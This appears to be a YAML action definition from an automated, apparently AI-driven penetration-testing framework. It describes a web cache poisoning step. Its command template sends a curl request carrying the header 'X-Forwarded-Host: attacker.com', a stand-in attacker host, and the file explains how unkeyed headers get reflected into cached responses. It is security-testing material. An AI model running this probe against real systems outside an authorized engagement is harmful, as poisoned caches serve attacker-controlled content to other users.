name: cache_poisoning
category: web
description: Web cache poisoning
preconditions:
- service.port==80
parameters:
  target_ip: from_engagement.target_ip
command_template: 'curl -s ''{target_url}'' -H ''X-Forwarded-Host: attacker.com'''
parser: web_response_parser
expected_effects:
- cache_poisoned
falsifier:
  pattern: error|failed|refused|denied
  timeout: 30
model_tier: haiku
mechanism: Inject cached response with malicious content. Unkeyed headers (X-Forwarded-Host, X-Original-URL) may be reflected
  but not part of cache key.
hacktricks_ref: pentesting-web/cache-deception/README.md
references:
  ocd_mindmap_node_ids:
  - 402c7c8c7f
  - 89a9c21fbb
  - 96b62ba41a
